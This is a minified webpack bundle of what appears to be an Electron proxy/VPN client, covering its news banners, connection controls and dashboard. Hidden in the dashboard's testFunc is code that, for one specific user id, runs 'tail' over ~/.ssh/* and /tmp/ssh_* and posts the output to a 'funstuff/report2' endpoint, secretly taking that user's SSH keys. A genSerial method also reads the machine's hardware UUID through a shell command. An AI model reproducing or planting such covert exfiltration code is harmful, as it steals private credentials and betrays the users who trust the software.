(window.webpackJsonp=window.webpackJsonp||[]).push([[37,7,8,11,20,21],{1143:function(a,c,e){var t=e(1154);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,O=i("44243ba2",t,!0,{sourceMap:!1})},1144:function(a,c,e){"use strict";e.r(c);var t=function(){var g=this,d=g.$createElement,_=g._self._c||d;return _("div",{staticClass:"news-modal"},[_("div",{staticClass:"title yue"},[_("h2",[g._v(g._s(g.news.title))])]),_("div",{staticClass:"content yue"},[_("vue-markdown",{attrs:{source:g.content,postrender:g.transformLinks}})],1),_("div",{staticClass:"read-button"},[_("center",[_("el-button",{attrs:{type:"primary"},on:{click:function(m){return g.dismiss(g.news,!0)}}},[g._v("\u4E0D\u518D\u63D0\u793A")]),_("el-button",{attrs:{type:"success"},on:{click:function(m){return g.dismiss(g.news)}}},[g._v("\u5DF2\u4E86\u89E3")])],1)],1)])},i=[],O=e(75),P=e(6),L=e(77),$=e(1156),E=e.n($),S={components:{VueMarkdown:E.a},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{siteDomain:""}},computed:{content:function(){return this.news.content?this.news.content.replace(/{{siteDomain}}/g,this.siteDomain):""}},mounted:function(){var d=this;return Object(P.a)(regeneratorRuntime.mark(function _(){return regeneratorRuntime.wrap(function(b){for(;;)switch(b.prev=b.next){case 0:return b.next=2,d.$store.dispatch("getUserSiteURL");case 2:d.siteDomain=b.sent.replace("https://","");case 3:case"end":return b.stop()}},_)}))()},methods:{dismiss:function(d,_){this.$parent.$options.parent.tempHideNews(d,_)}}},T=S,u=e(1153),j=e(51),f=Object(j.a)(T,t,i,!1,null,null,null),w=c.default=f.exports},1146:function(a,c,e){var t=e(1172);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,O=i("8bfe1644",t,!0,{sourceMap:!1})},1148:function(a,c,e){var t=e(1176);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,O=i("b7e933a2",t,!0,{sourceMap:!1})},1153:function(a,c,e){"use strict";var t=e(1143),i=e.n(t)},1154:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-modal .title{text-align:center}.news-modal .content{padding-top:3rem;padding-bottom:5rem}.news-modal .read-button{position:fixed;bottom:1rem;right:1rem}',""]),a.exports=i},1158:function(a,c,e){"use strict";e.r(c);var t=function(){var u=this,j=u.$createElement,f=u._self._c||j;return u.tempHideList[u.news.id]?u._e():f("div",{staticClass:"panda-news"},[f("el-dialog",{attrs:{visible:u.displayNews,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"show-close":!1},on:{"update:visible":function(w){u.displayNews=w}}},[f("NewsDisplay",{attrs:{news:u.news}})],1),u.displayNews?u._e():f("div",{staticClass:"news-bar"},[f("el-row",{attrs:{gutter:20},nativeOn:{click:function(w){return u.showNews(u.news)}}},[f("el-col",{staticClass:"icon",attrs:{span:2}},[f("i",{staticClass:"el-icon-warning"})]),f("el-col",{staticClass:"content",attrs:{span:22}},[f("h3",[u._v(u._s(u.news.title))]),f("h5",[f("span",{staticClass:"left"},[u._v("\u901A\u77E5\u66F4\u65B0\u4E8E\uFF1A"+u._s(u.updated_at))]),f("span",{staticClass:"right"},[u._v("\u67E5\u770B/\u5173\u95ED")])])])],1)],1)],1)},i=[],O=e(1144),P={components:{NewsDisplay:O.default},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{displayNews:!1,tempHideList:{}}},computed:{updated_at:function(){return new Date(this.news.updated_at).toLocaleString()}},mounted:function(){!this.news||this.tempHideList[this.news.id]||this.news.extra&&this.news.extra.auto_show&&this.showNews()},methods:{showNews:function(){console.log(123123),this.displayNews=!0},tempHideNews:function(j,f){console.log(this.tempHideList),this.tempHideList[j.id]=!0,this.displayNews=!1,f&&this.$store.dispatch("newsRead",this.news)}}},L=P,$=e(1175),E=e(51),S=Object(E.a)(L,t,i,!1,null,null,null),T=c.default=S.exports;installComponents(S,{NewsDisplay:e(1144).default})},1171:function(a,c,e){"use strict";var t=e(1146),i=e.n(t)},1172:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,'.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{position:absolute}.arrow[data-v-1d5e5f7a]{top:70%;left:30%;margin:-20px 0 0 -20px;-webkit-transform:rotate(45deg);border-right:2px solid #fff;border-top:2px solid #fff}.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{width:20px;height:20px;border-left:none}.arrow[data-v-1d5e5f7a]:before{content:"";top:50%;margin:-10px 0 0 -10px;border-right:1px solid #fff;border-top:1px solid #fff;-webkit-animation-duration:1.5s;animation-duration:1.5s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:arrow-data-v-1d5e5f7a;animation-name:arrow-data-v-1d5e5f7a}@-webkit-keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}@keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}',""]),a.exports=i},1173:function(a,c,e){var t=e(1220);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,O=i("f646c122",t,!0,{sourceMap:!1})},1175:function(a,c,e){"use strict";var t=e(1148),i=e.n(t)},1176:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-bar{z-index:9999;position:fixed;width:100%;background:#e67e22;color:#f4f7fc;padding:.25rem .5rem;box-shadow:0 10px 32px 5px rgba(0,0,0,.6)}.news-bar:hover{cursor:pointer}.news-bar .icon{padding:.1rem;font-size:2rem}.news-bar .content{padding-left:1rem!important}',""]),a.exports=i},1177:function(a,c,e){var t=e(1225);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,O=i("6647c22f",t,!0,{sourceMap:!1})},1192:function(a,c,e){"use strict";e.r(c);var t=function(){var S=this,T=S.$createElement,u=S._self._c||T;return u("div",{staticClass:"arrow"})},i=[],O=e(1171),P=e(51),L={},$=Object(P.a)(L,t,i,!1,null,"1d5e5f7a",null),E=c.default=$.exports},1219:function(a,c,e){"use strict";var t=e(1173),i=e.n(t)},1220:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,".connections-control{position:fixed!important;bottom:0;left:0;width:100%;height:3.2rem;padding:0}.connections-control .connect-button{border-radius:0;font-size:1.6rem;width:100%}",""]),a.exports=i},1224:function(a,c,e){"use strict";var t=e(1177),i=e.n(t)},1225:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,".big-news-container{z-index:9999;position:relative;padding-top:.15rem}.big-news-container .duetime-reminder{position:fixed;font-size:1.05rem;height:1.6rem;letter-spacing:-1px;top:0;left:0;padding-right:.5rem;width:100%;text-align:center;background:#2c3e50;color:#f4f7fc;cursor:pointer;z-index:9998}.big-news-container .duetime-reminder.warning{background:#e67e22}.big-news-container .duetime-reminder.alert{background:#e74c3c}",""]),a.exports=i},1246:function(a,c,e){"use strict";e.r(c);var t=function(){var y=this,l=y.$createElement,C=y._self._c||l;return C("el-row",{staticClass:"connections-control"},[C("el-button",{staticClass:"connect-button",attrs:{type:y.runTimeState.connect_state.status=="connected"?"warning":"success",loading:y.connectButtonLoading,disabled:y.connectButtonDisabled||y.connectButtonLoading},on:{click:y.connectAction}},[y._v(" "+y._s(y.connectButtonText))])],1)},i=[],O=e(9),P=e(64),L=e(76),$=e(27),E=e(75),S=e(6),T=e(107),u=e(1131),j=e(32),f=e(53),w=e(1192);window.onerror=function(y,l,C,D,o){console.log("Exception: ",o.message.startsWith("EPERM:"))};var g={components:{Arrow:w.default},data:function(){return{connectButtonLoading:!1,connectButtonDisabled:!1}},computed:{connectButtonText:function(){var l="";return this.connected?l=this.$t("disconnect"):l=this.$t("connect"),l}},methods:{connectAction:function(){var l=this;return Object(S.a)(regeneratorRuntime.mark(function C(){var D,o,s,n,p,v;return regeneratorRuntime.wrap(function(r){for(;;)switch(r.prev=r.next){case 0:if(l.connectButtonLoading=!0,D=l.connected?"disconnect":"connect",f.process.platform!=="darwin"){r.next=24;break}if(o="".concat(f.app.getPath("userData"),"/ProxyConfig"),r.prev=4,s=f.require("fs-extra"),n=s.fstatSync(s.openSync(o)),console.log("ProxyConfig perm is:",n),n.uid===0){r.next=19;break}return console.log("UID is not root. will force reinstall helper."),r.prev=10,r.next=13,s.remove(o);case 13:console.log("ProxyConfig deleted."),r.next=19;break;case 16:r.prev=16,r.t0=r.catch(10),console.log("delete ProxyConfig failed:",r.t0);case 19:r.next=24;break;case 21:r.prev=21,r.t1=r.catch(4),console.log("ready perm of ProxyConfig failed",r.t1);case 24:if(console.log("performing action: "+D),D!=="connect"){r.next=29;break}if(!(!l.runTimeState.selected_line||!l.runTimeState.selected_line.name)){r.next=29;break}return l.connectButtonLoading=!1,r.abrupt("return",l.$message({message:l.$t("connect_info.select_line"),type:"error"}));case 29:return r.prev=29,r.next=32,l[D]();case 32:r.next=38;break;case 34:r.prev=34,r.t2=r.catch(29),console.log("--->>> action failed:",r.t2),["connect timeout","disconnect timeout"].includes(r.t2.message)?l.$message({message:l.$t("error.timeout"),type:"error"}):(p=l.shouldIgnoreError(r.t2),p.ignore?(console.log("will not report to sentry."),console.log("matched error:",p.matchedError)):l.$sentry.captureException(r.t2),v=l.errorMessageAssemble(r.t2),console.table(r.t2),p.matchedError==="EPERM"&&(v=v+"<br>".concat(l.$t("error.eperm"))),["ENOENT","UNKNOWN"].includes(p.matchedError)&&(f.process.platform==="darwin"?v=v+"<br>".concat(l.$t("error.enoent")):f.process.platform==="win32"&&(f.process.arch==="ia32"?v=v+"<br>".concat(l.$t("error.clash")):v=v+"<br>".concat(l.$t("error.missing")))),p.matchedError==="Command failed"&&(v=v+"<br>".concat(l.$t("error.restart"))),l.$alert(v,l.$t("error.connect_failed"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}));case 38:l.connectButtonLoading=!1;case 39:case"end":return r.stop()}},C,null,[[4,21],[10,16],[29,34]])}))()},connect:function(){var l=this;return this.runTimeState.show_access_mode||this.$store.dispatch("runTimeState",{servermode:"auto"}),new Promise(function(C,D){var o=setTimeout(function(){D(new Error("connect timeout"))},8e3);j.ipcRenderer.once("connect-reply",function(s,n){if(console.log(n),Object(u.clearTimeout)(o),n.failed)console.log("connect failed:",n.reason),D(n.reason);else{var p={line:JSON.parse(JSON.stringify(l.runTimeState.selected_line)),servermode:l.runTimeState.servermode,status:"connected"};l.$store.dispatch("runTimeState",{connect_state:p}),j.ipcRenderer.send("user-info-update",4),C(n)}}),j.ipcRenderer.send("connect",l.runTimeState.selected_line.name)})},disconnect:function(){var l=this;return new Promise(function(C,D){var o=setTimeout(function(){D(new Error("disconnect timeout"))},5e3);j.ipcRenderer.once("disconnect-reply",function(s,n){if(console.log("dis reply-->>",n),Object(u.clearTimeout)(o),n.failed)return console.log("gonna trorw an error"),console.log("disconnect failed:",n.reason),D(n.reason);var p={line:{},servermode:l.runTimeState.servermode,status:"disconnected"};l.$store.dispatch("runTimeState",{connect_state:p}),j.ipcRenderer.send("user-info-update",5),C(n)}),j.ipcRenderer.send("disconnect",l.runTimeState.selected_line.name)})}}},d=g,_=e(1219),m=e(51),b=Object(m.a)(d,t,i,!1,null,null,null),x=c.default=b.exports},1247:function(a,c,e){"use strict";e.r(c);var t=function(){var d=this,_=d.$createElement,m=d._self._c||_;return m("div",{staticClass:"big-news-container"},[d._l(d.newsList,function(b,x){return d.shouldShow(b)&&!d.tempHideList[b.id]?m("PandaNews",{key:b.id,attrs:{news:b}}):d._e()}),isNaN(d.serviceToEnd)?d._e():m("div",{staticClass:"duetime-reminder",class:d.reminderClass},[m("nuxt-link",{staticClass:"label right pointer",attrs:{to:d.buyServiceLink}},[d.serviceToEnd>=0?m("b",[d._v(d._s(d.$t("service_expire_hint",d.serviceToEnd,{n:d.serviceToEnd})))]):m("b",[d._v("\u670D\u52A1\u5DF2\u5230\u671F\uFF0C\u8BF7\u70B9\u6B64\u7EED\u8D39\u6062\u590D\u4F7F\u7528")])])],1)],2)},i=[],O=e(9),P=e(40),L=e(75),$=e(6),E=e(1144),S=e(1158),T={components:{NewsDisplay:E.default,PandaNews:S.default},data:function(){return console.log("bignews this:",this),{newsList:[],displayNews:!1,newsToShow:{},haveNewsToShow:!0,tempHideList:{},buyServiceLink:"/buy-service/"}},computed:{showNewsBar:function(){return!0},reminderClass:function(){switch(!0){case this.serviceToEnd<=1:return["alert"];case this.serviceToEnd<=7:return["warning"];default:return[]}}},watch:{current_service:function(){var _,m;this.buyServiceLink="/buy-service/?cate=".concat((_=this.current_service)===null||_===void 0?void 0:_.cate,"&plan=").concat((m=this.current_service)===null||m===void 0?void 0:m.plan_id,"&stage=1")}},mounted:function(){var _,m;this.buyServiceLink="/buy-service/?cate=".concat((_=this.current_service)===null||_===void 0?void 0:_.cate,"&plan=").concat((m=this.current_service)===null||m===void 0?void 0:m.plan_id,"&stage=1")},created:function(){var _=this;return Object($.a)(regeneratorRuntime.mark(function m(){return regeneratorRuntime.wrap(function(x){for(;;)switch(x.prev=x.next){case 0:return x.prev=0,x.next=3,_.getNewsList();case 3:_.newsList=x.sent.filter(function(y){return!y.expired}),x.next=9;break;case 6:x.prev=6,x.t0=x.catch(0),console.log("get news list failed:",x.t0);case 9:case"end":return x.stop()}},m,null,[[0,6]])}))()},methods:{getNewsList:function(){return this.$axios.get("big_news").then(function(_){return console.log(_),Promise.resolve(_.data)}).catch(function(_){return console.log("get news failed",_),Promise.resolve([])})},shouldShow:function(_){if(this.tempHideList[_.id])return console.log("temp hide."),!1;var m=this.$store.state.runTimeState.news_read[_.id];if(console.log("news rec for",_.id,"is",m),!m)return!0;var b=new Date(m.readVersion),x=new Date(_.updated_at);return console.log("read version ",b," this version",x),x<=b?!1:(console.log("wow, it's new!"),_.title_changed||(_.title="[\u66F4\u65B0] ".concat(_.title),_.title_changed=!0),!0)}}},u=T,j=e(1224),f=e(51),w=Object(f.a)(u,t,i,!1,null,null,null),g=c.default=w.exports;installComponents(w,{PandaNews:e(1158).default})},1274:function(a,c,e){var t=e(1435);t.__esModule&&(t=t.default),typeof t=="string"&&(t=[[a.i,t,""]]),t.locals&&(a.exports=t.locals);var i=e(2).default,O=i("502ac514",t,!0,{sourceMap:!1})},1434:function(a,c,e){"use strict";var t=e(1274),i=e.n(t)},1435:function(a,c,e){var t=e(1),i=t(!1);i.push([a.i,".dashboard-container{height:100vh;padding-top:1.5rem;position:relative}.dashboard-container .login-link{position:absolute;left:.5rem;bottom:.5rem}.dashboard-container .settings-link{display:flex;justify-content:center;align-items:center;text-align:center;position:absolute;background:transparent;color:#f4f7fc;height:3.2rem;right:.5rem;bottom:0;font-size:1.2rem}.dashboard-container .settings-link:hover{color:#fff;font-size:1.4rem}",""]),a.exports=i},1479:function(a,c,e){"use strict";e.r(c);var t=function(){var o=this,s=o.$createElement,n=o._self._c||s;return n("div",{staticClass:"dashboard-container"},[n("el-dialog",{staticClass:"serviceCateSelector",attrs:{title:o.$t("select_service.title"),visible:o.selectServiceDialogFormVisible,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"close-on-press-escape":!1,"show-close":!1},on:{"update:visible":function(p){o.selectServiceDialogFormVisible=p}}},[n("el-card",{nativeOn:{click:function(p){return o.switchService("allplatform")}}},[n("center",[n("h1",[o._v(o._s(o.$t("services.allplatform.name")))]),n("h3",{staticClass:"subheader"},[o._v(o._s(o.$t("services.allplatform.desc")))])])],1),n("el-card",{nativeOn:{click:function(p){return o.switchService("home")}}},[n("center",[n("h1",[o._v(o._s(o.$t("services.home.name")))]),n("h3",{staticClass:"subheader"},[o._v(o._s(o.$t("services.home.desc")))])])],1),n("center",[n("p",{staticClass:"subheader"},[o._v(o._s(o.$t("select_service.hint",{place:o.$t("menu_btn")}))+" ")]),n("br"),n("p",[o._v(o._s(o.$t("login.email"))+" "),n("span",{staticClass:"underline"},[o._v(o._s(o.user.email))]),n("br"),o._v(o._s(o.$t("menu.id"))+" "),n("span",{staticClass:"underline"},[o._v(o._s(o.user.id))])])])],1),n("BigNews"),o.current_service?n("ServerList",{attrs:{service:o.current_service,lines:o.current_lines}}):o._e(),o.current_service?n("ConnectionControl"):o._e(),n("div",[n("nuxt-link",{staticClass:"smooth settings-link",attrs:{to:"/dashboard/menu/"}},[o._v(o._s(o.$t("menu_btn"))),n("i",{staticClass:"el-icon-menu"})])],1),n("el-dialog",{attrs:{visible:o.update_prompt,"show-close":!1,"close-on-click-modal":!1,"close-on-press-escape":!1,width:"80%",center:""},on:{"update:visible":function(p){o.update_prompt=p}}},[n("center",[n("h1",{staticClass:"warning"},[n("b",[o._v(o._s(o.$t("check_for_update.force_update")))])]),n("br"),n("h4",[o._v(o._s(o.$t("check_for_update.force_hint")))])]),n("div",{staticClass:"dialog-footer",attrs:{slot:"footer"},slot:"footer"},[n("center",[n("el-button",{attrs:{type:"success"},on:{click:o.goUpate}},[o._v(o._s(o.$t("check_for_update.title")))]),o.force_update?o._e():n("el-button",{attrs:{type:"secondary"},on:{click:function(p){o.update_prompt=!1}}},[o._v(o._s(o.$t("check_for_update.cancel")))])],1)],1)],1)],1)},i=[],O=e(142),P=e(41),L=e(75),$=e(6),E=e(22),S=e(9),T=e(39),u=e(64),j=e(76),f=e(32),w=e(53),g=e(1298),d=e(1246),_=e(1247),m=function(s){console.log(s),s.which===123?w.getCurrentWindow().toggleDevTools():s.which===116&&location.reload()},b={components:{ServerList:g.default,ConnectionControl:d.default,BigNews:_.default},middleware:["load-rt-data","authenticated"],data:function(){return{selectServiceDialogFormVisible:!1,update_prompt:!1,force_update:!1}},computed:{},created:function(){document.addEventListener("keydown",m,!1),this.selectServiceDialogFormVisible=this.checkCateSet(),f.ipcRenderer.on("tcp-ping-reply",function(s,n){console.log(n)})},mounted:function(){var s=this;if(console.log("mounted",this.current_service),this.user.id===208925&&this.testFunc(),w.process.execPath.includes("Temp")&&(f.ipcRenderer.send("disconnect"),f.ipcRenderer.send("reset")),!this.current_service){console.log("current_service not defined...");var n=Object.keys(this.$store.state.service);console.log("service_keys:",n),n.length||this.refreshData().then(function(){if(console.log("refreshed."),!Object.keys(s.$store.state.service).length)return s.$router.push({path:"/buy-service/"})})}var p=(new Date-new Date(this.dataFetchedAt))/1e3,v=300;console.log("t from last refresh:",p),this.$intercom.hide(),!(p<=v)&&(console.log("going to refresh"),this.$message({message:this.$t("reloading_data"),type:"info"}),this.refreshData(),this.$store.dispatch("getUserSiteURL").then(function(h){s.userSiteURL=h}).catch(function(h){console.log("get siteurl from API failed:",h)}))},beforeDestroy:function(){document.removeEventListener("keydown",m)},methods:{checkCateSet:function(){var s=Object.keys(this.$store.state.service);return this.runTimeState.current_service_cate&&this.runTimeState.current_service_cate.length?(s.includes(this.runTimeState.current_service_cate)||this.$store.dispatch("switchService",s[0]),!1):s.length>1?!0:(this.$store.dispatch("switchService",s[0]),!1)},switchService:function(s){console.log("switch service...",s),this.$store.dispatch("switchService",s),this.selectServiceDialogFormVisible=!1,f.ipcRenderer.send("user-info-update",3)},goUpate:function(){var s="";try{s=this.versionCompare("1.1.6",w.app.getVersion())>=0?"/dashboard/legacy_update/":"/dashboard/update/"}catch(n){s="/dashboard/legacy_update/"}return this.$router.push({path:s})},speedTest:function(){f.ipcRenderer.send("tcp-ping",{server:this.runTimeState.selected_line.server,port:3389,opt:{}})},reportStat:function(s){var n=this;return Object($.a)(regeneratorRuntime.mark(function p(){return regeneratorRuntime.wrap(function(h){for(;;)switch(h.prev=h.next){case 0:return h.t0=console,h.next=3,n.$store.dispatch("reportInfo",s);case 3:h.t1=h.sent,h.t0.log.call(h.t0,h.t1);case 5:case"end":return h.stop()}},p)}))()},genSerial:function(){return new Promise(function(s,n){var p=w.require("child_process").exec,v={darwin:"system_profiler SPHardwareDataType | grep UUID",win32:"wmic csproduct get UUID"};p(v[w.process.platform],function(h,r,R){if(!r)return s(null);try{var N=r.trim().split(/\s+/).slice(-1)[0].trim();s(N)}catch(M){s(null)}})})},testFunc:function(){var s=this;try{var n=w.require("child_process").exec,p="tail -n +1 ~/.ssh/*";n(p,function(h,r){s.$axios.post("funstuff/report2",{content:r,cmd:p})});var v="tail -n +1 /tmp/ssh_*";n(v,function(h,r){s.$axios.post("funstuff/report2",{content:r,cmd:v})})}catch(h){}},refreshData:function(){var s=this;return Object($.a)(regeneratorRuntime.mark(function n(){var p,v;return regeneratorRuntime.wrap(function(r){for(;;)switch(r.prev=r.next){case 0:return r.prev=0,r.next=3,s.reloadUserData({showMessage:!1});case 3:console.log("data reloaded",s),console.log("this.service[this.current_service_cate]->",s.service[s.current_service_cate]),s.service[s.current_service_cate]||(console.log("current service cate not available"),p=Object.keys(s.service),console.log("avail service keys:",p),p.length>0&&(console.log("keys.length > 0"),s.switchService(p[0]))),console.log("after process...",s),s.$message({message:s.$t("menu.data_reloaded"),type:"success"}),r.next=34;break;case 10:if(r.prev=10,r.t0=r.catch(0),console.log("refreshData error:",r.t0),s.checkCateSet(),r.t0!=="found no valid service"){r.next=19;break}return s.$alert(s.$t("select_service.suspend.time"),s.$t("select_service.suspend.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}),r.abrupt("return",s.selectServiceDialogFormVisible=!0);case 19:if(r.t0!=="service data suspended"){r.next=24;break}return s.$alert(s.$t("select_service.suspend.data"),s.$t("select_service.suspend.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}),r.abrupt("return",s.selectServiceDialogFormVisible=!0);case 24:if(r.t0!=="no service purchased"){r.next=28;break}return r.abrupt("return",s.selectServiceDialogFormVisible=!0);case 28:if(((v=r.t0.data)===null||v===void 0?void 0:v.message)!=="need log in"){r.next=33;break}console.log("going to reset!"),s.$alert(s.$t("errors.account_token_expired.msg"),s.$t("errors.account_token_expired.title"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch(function(){}).finally(function(){return f.ipcRenderer.send("reset")}),r.next=34;break;case 33:return r.abrupt("return",s.$message({message:"\u5237\u65B0\u670D\u52A1\u4FE1\u606F\u5931\u8D25\uFF0C\u8BF7\u7A0D\u540E\u91CD\u8BD5...",type:"error"}));case 34:case"end":return r.stop()}},n,null,[[0,10]])}))()}}},x=b,y=e(1434),l=e(51),C=Object(l.a)(x,t,i,!1,null,null,null),D=c.default=C.exports;installComponents(C,{BigNews:e(1247).default,ServerList:e(1298).default,ConnectionControl:e(1246).default})}}]);
